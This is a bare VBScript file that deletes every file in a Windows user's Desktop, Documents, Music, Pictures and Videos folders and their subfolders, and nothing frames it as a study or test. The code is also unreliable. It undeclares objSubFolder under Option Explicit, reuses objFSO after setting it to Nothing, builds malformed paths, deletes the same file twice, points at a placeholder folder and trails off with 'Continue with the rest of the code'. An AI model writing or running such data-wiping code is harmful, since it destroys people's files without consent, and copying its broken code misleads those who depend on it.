Option Explicit

Dim objFSO, objFolder, objFile, objShell, i

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the Desktop folder
Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))

' Loop through each file in the Desktop folder and delete it
For Each objFile In objFolder.Files
objFSO.DeleteFile(objFile)
Next

' Loop through each subfolder in the Desktop folder
For Each objSubFolder In objFolder.SubFolders
' Loop through each file in the subfolder and delete it
For Each objFile In objSubFolder.Files
objFSO.DeleteFile(objFile)
Next
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objSubFolder = Nothing
Set objFolder = Nothing
Set objFSO = Nothing

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Get the documents folder
Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("MyDocuments"))

' Loop through each file in the documents folder and delete it
For Each objFile In objFolder.Files
objFSO.DeleteFile(objFile)
Next

' Loop through each subfolder in the documents folder
For Each objSubFolder In objFolder.SubFolders
' Loop through each file in the subfolder and delete it
For Each objFile In objSubFolder.Files
objFSO.DeleteFile(objFile)
Next
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objSubFolder = Nothing
Set objFolder = Nothing

' Get the music folder
Set objFolder = objFSO.GetFolder("C:\Users%USERNAME%\Music")

' Loop through each file in the music folder and delete it
For Each objFile In objFolder.Files
objFSO.DeleteFile(objFile)
Next

' Loop through each subfolder in the music folder
For Each objSubFolder In objFolder.SubFolders
' Loop through each file in the subfolder and delete it
For Each objFile In objSubFolder.Files
objFSO.DeleteFile(objFile)
Next
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objSubFolder = Nothing
Set objFolder = Nothing

' Get the pictures folder
Set objFolder = objFSO.GetFolder("C:\Users%USERNAME%\Pictures")

' Loop through each file in the pictures folder and delete it
For Each objFile In objFolder.Files
objFSO.DeleteFile(objFile)
Next

' Loop through each subfolder in the pictures folder
For Each objSubFolder In objFolder.SubFolders
' Loop through each file in the subfolder and delete it
For Each objFile In objSubFolder.Files
objFSO.DeleteFile(objFile)
Next
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objSubFolder = Nothing
Set objFolder = Nothing

' Get the videos folder
Set objFolder = objFSO.GetFolder("C:\Users%USERNAME%\Videos")

' Loop through each file in the videos folder and delete it
For Each objFile In objFolder.Files
objFSO.DeleteFile(objFile)
Next

' Loop through each subfolder in the videos folder
For Each objSubFolder In objFolder.SubFolders
' Loop through each file in the subfolder and delete it
For Each objFile In objSubFolder.Files
objFSO.DeleteFile(objfile)
objFSO.DeleteFile(objFile)
Next
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objSubFolder = Nothing
Set objFolder = Nothing

' Get the other possible folder
Set objFolder = objFSO.GetFolder("C:\Users%USERNAME%\OtherPossibleFolder")

' Loop through each file in the other possible folder and delete it
For Each objFile In objFolder.Files
objFSO.DeleteFile(objFile)
Next

' Loop through each subfolder in the other possible folder
For Each objSubFolder In objFolder.SubFolders
' Loop through each file in the subfolder and delete it
For Each objFile In objSubFolder.Files
objFSO.DeleteFile(objFile)
Next
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objSubFolder = Nothing
Set objFolder = Nothing

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Continue with the rest of the code...
